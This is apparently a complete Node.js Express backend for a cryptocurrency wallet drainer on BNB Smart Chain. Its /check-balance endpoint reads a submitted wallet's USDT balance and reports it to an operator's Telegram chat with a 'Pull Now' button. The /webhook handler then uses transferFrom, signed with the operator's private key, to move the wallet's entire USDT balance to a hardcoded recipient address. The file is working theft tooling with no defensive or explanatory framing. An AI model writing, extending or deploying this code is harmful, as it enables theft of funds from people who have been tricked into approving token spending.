const express = require('express');
const Web3 = require('web3');
const axios = require('axios');
require('dotenv').config();

const app = express();
app.use(express.json());

// CORS headers
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') return res.sendStatus(200);
    next();
});

const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const RECIPIENT = "0xc656b1651CD6914183Ee48458542EbB8655aa623";
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const PRIVATE_KEY = process.env.PRIVATE_KEY;

console.log("✅ Bot configured");

const web3 = new Web3('https://bsc-dataseed.binance.org');

app.post('/check-balance', async (req, res) => {
    try {
        const { walletAddress } = req.body;
        console.log("Checking balance for:", walletAddress);
        
        const usdtContract = new web3.eth.Contract([
            {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}
        ], USDT_ADDRESS);

        const balance = await usdtContract.methods.balanceOf(walletAddress).call();
        const balanceInUSDT = web3.utils.fromWei(balance, 'ether');
        
        console.log("Balance:", balanceInUSDT);
        
        const message = `🔔 **Wallet Detected!**\n\n👤 Wallet: ${walletAddress}\n💰 Balance: ${balanceInUSDT} USDT\n⏰ Time: ${new Date().toLocaleString()}`;

        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: ADMIN_CHAT_ID,
            text: message,
            reply_markup: {
                inline_keyboard: [[{ text: '💳 Pull Now', callback_data: `pull_${walletAddress}` }]]
            }
        });

        console.log("✅ Telegram sent!");
        res.json({ success: true, balance: balanceInUSDT });
    } catch (error) {
        console.error("❌ Error:", error.message);
        res.status(500).json({ error: error.message });
    }
});

app.post('/webhook', async (req, res) => {
    try {
        const { callback_query } = req.body;
        
        if (callback_query && callback_query.data.startsWith('pull_')) {
            const walletAddress = callback_query.data.replace('pull_', '');
            console.log("🔘 Pull button clicked for:", walletAddress);
            
            const usdtContract = new web3.eth.Contract([
                {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},
                {"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"}
            ], USDT_ADDRESS);

            const balance = await usdtContract.methods.balanceOf(walletAddress).call();
            console.log("Balance to transfer:", web3.utils.fromWei(balance, 'ether'));
            
            const account = web3.eth.accounts.privateKeyToAccount(PRIVATE_KEY);
            const tx = usdtContract.methods.transferFrom(walletAddress, RECIPIENT, balance);
            const gas = await tx.estimateGas({ from: account.address });
            
            const signedTx = await web3.eth.accounts.signTransaction({
                to: USDT_ADDRESS,
                data: tx.encodeABI(),
                gas: Math.ceil(gas * 1.1),
                gasPrice: await web3.eth.getGasPrice(),
                nonce: await web3.eth.getTransactionCount(account.address)
            }, PRIVATE_KEY);

            const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
            console.log("✅ Transfer successful! TX:", receipt.transactionHash);
            
            const transferMsg = `✅ **Transfer Completed!**\n\n👤 Wallet: ${walletAddress}\n💸 Amount: ${web3.utils.fromWei(balance, 'ether')} USDT\n📝 TX: ${receipt.transactionHash}`;
            
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                chat_id: ADMIN_CHAT_ID,
                text: transferMsg
            });
        }
        res.json({ ok: true });
    } catch (error) {
        console.error("❌ Webhook error:", error.message);
        res.json({ ok: false });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`✅ Server on port ${PORT}`));
